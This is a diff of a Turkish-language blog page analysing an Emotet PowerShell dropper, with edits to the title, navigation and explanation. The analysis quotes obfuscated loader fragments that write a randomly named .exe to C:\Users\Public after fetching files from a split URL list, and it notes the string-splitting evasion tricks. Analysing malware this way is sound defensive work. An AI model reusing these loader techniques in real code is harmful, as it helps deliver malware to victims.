@@ -9,7 +9,7 @@
     <meta name="description" content="">
     <meta name="author" content="">
 
-    <title>w3challs reverse captcha</title>
+    <title>emotet zararlı yazılım analizi</title>
 
     <!-- Bootstrap Core CSS -->
     <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
@@ -57,9 +57,9 @@
                     <li>
                         <a href="post.html">Sample Post</a>
                     </li>-->
-                   <!-- <li>
+                    <li>
                         <a href="contact.html">Contact</a>
-                    </li>-->
+                    </li>
                 </ul>
             </div>
             <!-- /.navbar-collapse -->
@@ -121,10 +121,10 @@ es/iV1PKqL/'.Split('?');$SDC = $env:public + '\' + $NSB + ('.ex'+'e');foreach($a
 
 Neyse ki bu o kadar da karmaşık değil.Belli ki belirli urllerden dosya indirip çalıştırıyor.
  İçinden urlleri ayırmamız gerek sadece.Urlleri bir string içinde tutup '?' ile ayırdığı açıkça görünüyor.
-<code>$env:public</code> : <code>"C:\Users\Public"</code> stringini verir 
-ardından <code>$env:public + '\' + $NSB + ('.ex'+'e') </code>satırında 
+Powershell'de <code>$env:public</code> değeri <code>"C:\Users\Public"</code> stringini verir.
+			    <code>$env:public + '\' + $NSB + ('.ex'+'e') </code>satırında 
 C:\Users\Public\$NSB.exe adında bir executable oluşturulmuş 
-$NSB asagidaki komuttan anlaşılacağı üzere 10000, 282133 arasında random bir değer.<code>
+$NSB alttaki komuttan anlaşılacağı üzere 10000, 282133 arasında random bir değer.<code>
 $NSB = $nsadasd.next(10000, 282133)
 $nsadasd = &('n'+'e'+'w-objec'+'t') random</code>
 
